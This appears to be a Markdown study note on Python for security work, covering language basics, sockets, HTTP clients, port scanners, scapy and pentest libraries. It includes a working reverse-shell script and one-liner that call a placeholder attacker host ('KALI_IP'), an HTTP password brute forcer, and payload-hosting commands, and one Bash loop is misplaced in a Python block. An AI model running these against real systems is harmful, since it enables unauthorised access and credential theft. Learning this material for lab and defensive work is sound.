

Python for security · MD
# Python for Security
 
Python basics and security-focused patterns — HTTP clients, socket scanning, reverse shells, log parsing, packet crafting.
 
Python is the de facto language for security tooling. Ships on nearly every Linux distro, has an enormous ecosystem, and is expressive enough to write real exploits in a few lines.
 
---
 
## Setup
 
### Python 3 on Linux
 
Python 3 is pre-installed on most modern distros. Check:
```bash
python3 --version
which python3
```
 
Install if missing:
```bash
sudo apt install python3 python3-pip -y      # Debian/Ubuntu
sudo dnf install python3 python3-pip -y      # RHEL/CentOS
```
 
### Virtual environments
 
Always use a venv for anything beyond a throwaway script. See [Linux Storage & Boot — Python virtual environments](./linux-storage-and-boot.md#python-virtual-environments).
 
Quick recap:
```bash
python3 -m venv myenv
source myenv/bin/activate
pip install <package>
deactivate
```
 
### pip essentials
 
```bash
# Install
pip install requests
 
# Install a specific version
pip install requests==2.31.0
 
# Install from a requirements file
pip install -r requirements.txt
 
# List installed
pip list
 
# Show info about a package
pip show requests
 
# Freeze current packages for sharing
pip freeze > requirements.txt
 
# Upgrade
pip install --upgrade requests
```
 
---
 
## Python quick refresher
 
### Running a script
 
```bash
python3 script.py
```
 
Make executable with a shebang and `chmod +x`:
```python
#!/usr/bin/env python3
```
 
### Data types
 
```python
# Strings
name = "Blake"
name = 'also fine'
multi = """multi
line"""
 
# Numbers
count = 5           # int
pi = 3.14           # float
 
# Booleans
is_admin = True
 
# None
result = None
 
# Lists (ordered, mutable)
ports = [22, 80, 443]
ports.append(3389)
ports[0]                   # 22
ports[-1]                  # 3389 (negative index from end)
 
# Tuples (ordered, immutable)
target = ("192.168.1.1", 22)
 
# Dictionaries (key-value, unordered pre-3.7, insertion-ordered 3.7+)
host = {"ip": "10.0.0.5", "os": "linux", "ports": [22, 80]}
host["ip"]                 # "10.0.0.5"
 
# Sets (unique values, unordered)
seen_ips = {"10.0.0.1", "10.0.0.2"}
seen_ips.add("10.0.0.1")   # duplicate ignored
```
 
### Control flow
 
```python
# if / elif / else
if port == 22:
    print("SSH")
elif port == 80:
    print("HTTP")
else:
    print("Unknown")
 
# for loop
for port in [22, 80, 443]:
    print(port)

# for loop to find and mount an iso
for iso in $(find / -name "*.iso" 2>/dev/null); do sudo mount -o loop "$iso" /mnt/iso
 
# range
for i in range(10):        # 0..9
    print(i)
 
for i in range(1, 11):     # 1..10
    print(i)
 
# while
count = 0
while count < 5:
    count += 1
 
# List comprehension (idiomatic Python — learn this)
open_ports = [p for p in ports if is_open(p)]
squares = [x*x for x in range(10)]
 
# Dict comprehension
port_map = {p: is_open(p) for p in ports}
```
 
### Functions
 
```python
def scan(target, ports=None, timeout=1):
    ports = ports or [22, 80, 443]
    results = []
    for port in ports:
        results.append((port, is_open(target, port)))
    return results
 
# Positional and keyword args
scan("10.0.0.5")
scan("10.0.0.5", ports=[22, 3389], timeout=2)
```
 
### File I/O
 
```python
# Read a whole file
with open("wordlist.txt") as f:
    contents = f.read()
 
# Read line by line (memory-efficient for big files)
with open("/var/log/auth.log") as f:
    for line in f:
        if "Failed password" in line:
            print(line.strip())
 
# Write
with open("output.txt", "w") as f:
    f.write("hello\n")
 
# Append
with open("output.txt", "a") as f:
    f.write("more\n")
```
 
`with` automatically closes the file even if an exception fires.
 
### Error handling
 
```python
try:
    sock.connect((host, port))
except socket.timeout:
    print(f"{host}:{port} timeout")
except ConnectionRefusedError:
    print(f"{host}:{port} closed")
except Exception as e:
    print(f"other error: {e}")
finally:
    sock.close()
```
 
### Command-line arguments
 
Quick way — `sys.argv`:
```python
import sys
target = sys.argv[1]
port = int(sys.argv[2])
```
 
Better way — `argparse`:
```python
import argparse
 
parser = argparse.ArgumentParser(description="Simple port scanner")
parser.add_argument("target", help="IP or hostname")
parser.add_argument("-p", "--ports", default="1-1000",
                    help="Port range or comma list")
parser.add_argument("-t", "--timeout", type=float, default=1.0)
parser.add_argument("-v", "--verbose", action="store_true")
 
args = parser.parse_args()
print(args.target, args.ports)
```
 
Usage:
```bash
./scanner.py 10.0.0.5 -p 22,80,443 -v
```
 
---
 
## Standard library modules used in security work
 
### os — filesystem and environment
 
```python
import os
 
os.getcwd()                        # current directory
os.chdir("/tmp")                   # change directory
os.listdir(".")                    # list files
os.path.exists("/etc/passwd")      # does path exist?
os.path.isfile("/etc/passwd")
os.path.isdir("/etc")
os.environ["HOME"]                 # env vars
os.system("ls -la")                # run a shell command (avoid for security work)
os.remove("file.txt")
```
 
### subprocess — running external commands (preferred over os.system)
 
```python
import subprocess
 
# Simple — run and get output
result = subprocess.run(["nmap", "-sn", "10.0.0.0/24"],
                        capture_output=True, text=True)
print(result.stdout)
print(result.returncode)
 
# With shell=True — CAREFUL: never pass unsanitized user input
result = subprocess.run("nmap -sn 10.0.0.0/24 | grep 'Nmap scan'",
                        shell=True, capture_output=True, text=True)
```
 
**Security note:** `shell=True` with user input is a command injection vector. Prefer passing a list of args.
 
### socket — raw TCP/UDP
 
Core for network tools.
 
```python
import socket
 
# TCP connect (client)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)
try:
    s.connect(("10.0.0.5", 22))
    banner = s.recv(1024)
    print(banner.decode(errors="ignore"))
finally:
    s.close()
 
# TCP listen (server)
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 4444))
srv.listen(1)
conn, addr = srv.accept()
print(f"Connection from {addr}")
```
 
### requests — HTTP client (installed via pip)
 
The go-to for anything HTTP.
 
```python
import requests
 
# GET
r = requests.get("http://example.com")
print(r.status_code)
print(r.headers)
print(r.text)
 
# POST with form data
r = requests.post("http://target/login",
                  data={"user": "admin", "pass": "password"})
 
# POST with JSON
r = requests.post("http://target/api",
                  json={"key": "value"})
 
# Custom headers
headers = {"User-Agent": "Mozilla/5.0", "X-Forwarded-For": "127.0.0.1"}
r = requests.get("http://target", headers=headers)
 
# Cookies
r = requests.get("http://target", cookies={"session": "abc123"})
 
# Follow through a session (keeps cookies)
s = requests.Session()
s.post("http://target/login", data={"user":"a","pass":"b"})
r = s.get("http://target/dashboard")   # authenticated
 
# Ignore SSL errors (useful for lab targets with self-signed certs)
r = requests.get("https://target", verify=False)
 
# Timeout
r = requests.get("http://target", timeout=5)
```
 
### re — regex
 
See [Regex](./regex.md) for the full pattern language.
 
```python
import re
 
# Find all IPs in a log
ips = re.findall(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", log_text)
 
# Match at start
m = re.match(r"user=(\w+)", "user=admin&pass=secret")
if m:
    print(m.group(1))    # admin
 
# Search anywhere
m = re.search(r"password=(\S+)", config_text)
 
# Replace
sanitized = re.sub(r"password=\S+", "password=REDACTED", text)
 
# Compile for reuse (faster if used many times)
ip_re = re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")
ip_re.findall(log_text)
```
 
### json — parsing API responses
 
```python
import json
 
# String to dict
data = json.loads('{"host": "10.0.0.5", "port": 22}')
 
# Dict to string
s = json.dumps({"host": "10.0.0.5"}, indent=2)
 
# File I/O
with open("config.json") as f:
    config = json.load(f)
 
with open("output.json", "w") as f:
    json.dump(results, f, indent=2)
```
 
### base64, hashlib — encoding and hashing
 
```python
import base64
 
# Encode
encoded = base64.b64encode(b"admin:password").decode()
# Decode
decoded = base64.b64decode(encoded).decode()
```
 
```python
import hashlib
 
# Common hashes
hashlib.md5(b"password").hexdigest()
hashlib.sha1(b"password").hexdigest()
hashlib.sha256(b"password").hexdigest()
 
# Hash a file
with open("suspicious.bin", "rb") as f:
    print(hashlib.sha256(f.read()).hexdigest())
```
 
### urllib.parse — URL manipulation
 
```python
from urllib.parse import quote, unquote, urlparse
 
# URL-encode payload characters
payload = quote("<script>alert(1)</script>")
# %3Cscript%3Ealert%281%29%3C%2Fscript%3E
 
# Parse a URL
u = urlparse("https://target.com:8080/path?q=1")
u.hostname       # 'target.com'
u.port           # 8080
u.path           # '/path'
u.query          # 'q=1'
```
 
---
 
## Common patterns
 
### Simple TCP port scanner
 
```python
#!/usr/bin/env python3
import socket
import argparse
 
def scan(host, port, timeout=1):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False
    finally:
        s.close()
 
def parse_ports(s):
    """Parse '22,80,443' or '1-1000' into a list."""
    if "-" in s:
        start, end = map(int, s.split("-"))
        return list(range(start, end + 1))
    return [int(p) for p in s.split(",")]
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("-p", "--ports", default="1-1024")
    parser.add_argument("-t", "--timeout", type=float, default=1)
    args = parser.parse_args()
 
    for port in parse_ports(args.ports):
        if scan(args.target, port, args.timeout):
            print(f"{args.target}:{port} OPEN")
```
 
### Threaded scanner (much faster)
 
```python
from concurrent.futures import ThreadPoolExecutor
 
def scan_all(host, ports, workers=100):
    with ThreadPoolExecutor(max_workers=workers) as pool:
        results = pool.map(lambda p: (p, scan(host, p)), ports)
        return [p for p, is_open in results if is_open]
 
open_ports = scan_all("10.0.0.5", range(1, 1001))
print(open_ports)
```
 
### Banner grabber
 
```python
import socket
 
def grab_banner(host, port, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        # Some services (HTTP) need input first
        if port in (80, 8080, 8000):
            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
        return s.recv(1024).decode(errors="ignore")
    except Exception as e:
        return f"error: {e}"
    finally:
        s.close()
 
for port in (22, 25, 80, 443):
    print(f"[{port}] {grab_banner('10.0.0.5', port)}")
```
 
### Reverse shell (client on target)
 
```python
#!/usr/bin/env python3
import socket, subprocess, os
 
HOST = "KALI_IP"
PORT = 4444
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
 
# Redirect stdin, stdout, stderr to the socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
 
subprocess.call(["/bin/sh", "-i"])
```
 
One-liner version (works when you can only send a single command):
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KALI_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
 
### HTTP login brute forcer
 
```python
import requests
 
TARGET = "http://10.0.0.5/login"
USER = "admin"
 
with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
    for pw in f:
        pw = pw.strip()
        r = requests.post(TARGET, data={"user": USER, "pass": pw})
        # Adjust condition to whatever indicates success on this app
        if "Invalid" not in r.text:
            print(f"[+] Found: {pw}")
            break
```
 
### Log parser — extract failed SSH logins
 
```python
import re
from collections import Counter
 
pattern = re.compile(r"Failed password for (?:invalid user )?(\S+) from (\S+)")
 
with open("/var/log/auth.log") as f:
    matches = pattern.findall(f.read())
 
# Count attempts per IP
by_ip = Counter(ip for _, ip in matches)
for ip, count in by_ip.most_common(10):
    print(f"{count:5d}  {ip}")
 
# Count attempts per username
by_user = Counter(user for user, _ in matches)
for user, count in by_user.most_common(10):
    print(f"{count:5d}  {user}")
```
 
### Simple HTTP file server (payload hosting)
 
Standard library only:
```bash
python3 -m http.server 8080
```
 
Bind to a specific interface, serve from a specific directory:
```bash
python3 -m http.server 8080 --bind 0.0.0.0 --directory /path/to/payloads
```
 
Programmatic version for customization:
```python
from http.server import HTTPServer, SimpleHTTPRequestHandler
HTTPServer(("0.0.0.0", 8080), SimpleHTTPRequestHandler).serve_forever()
```
 
### File hash comparison
 
```python
import hashlib
import sys
 
def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            h.update(chunk)
    return h.hexdigest()
 
expected = "abc123..."
actual = sha256(sys.argv[1])
print("MATCH" if actual == expected else "MISMATCH")
```
 
---
 
## Security-specific libraries (third-party)
 
### Scapy — packet crafting and sniffing
 
```bash
pip install scapy
```
 
```python
from scapy.all import *
 
# Send an ICMP ping
resp = sr1(IP(dst="10.0.0.5") / ICMP(), timeout=2)
 
# Craft and send a SYN
resp = sr1(IP(dst="10.0.0.5") / TCP(dport=80, flags="S"), timeout=2)
 
# Sniff 10 packets
pkts = sniff(count=10, filter="tcp port 80")
for p in pkts:
    print(p.summary())
 
# Sniff and process each in real time
def handler(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 80:
        print(pkt.summary())
sniff(prn=handler, filter="tcp", store=False)
```
 
### Paramiko — SSH client
 
```bash
pip install paramiko
```
 
```python
import paramiko
 
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect("10.0.0.5", username="user", password="pass")
 
stdin, stdout, stderr = client.exec_command("id")
print(stdout.read().decode())
client.close()
```
 
### pwntools — CTF/exploit development
 
```bash
pip install pwntools
```
 
Purpose-built for binary exploitation and CTFs. Handles socket connections, ELF parsing, shellcode assembly, ROP chains.
 
```python
from pwn import *
 
# Connect to a challenge
p = remote("ctf.example.com", 1337)
p.recvuntil(b"password: ")
p.sendline(b"admin")
print(p.recv().decode())
```
 
### impacket — Windows/Active Directory tooling
 
```bash
pip install impacket
```
 
Provides Python implementations of SMB, LDAP, Kerberos, and dozens of AD attack tools (`psexec.py`, `smbclient.py`, `GetNPUsers.py`, `secretsdump.py`, etc.). Ships with Kali.
 
---
 
## Debugging
 
### Print debugging
 
Fastest for small scripts:
```python
print(f"[DEBUG] target={target} port={port}")
```
 
Use f-strings — clearer than `.format()` and much faster than `%`.
 
### pdb — interactive debugger
 
Drop a breakpoint anywhere:
```python
breakpoint()   # Python 3.7+
```
 
At the pdb prompt:
- `n` — next line
- `s` — step into
- `c` — continue
- `p <var>` — print a variable
- `l` — list surrounding code
- `q` — quit
### logging — better than print for anything real
 
```python
import logging
 
logging.basicConfig(level=logging.DEBUG,
                    format="%(asctime)s [%(levelname)s] %(message)s")
 
logging.debug("verbose stuff")
logging.info("normal progress")
logging.warning("something odd")
logging.error("actual problem")
```
 
Set the level once, control verbosity across the whole script.
 
---
 
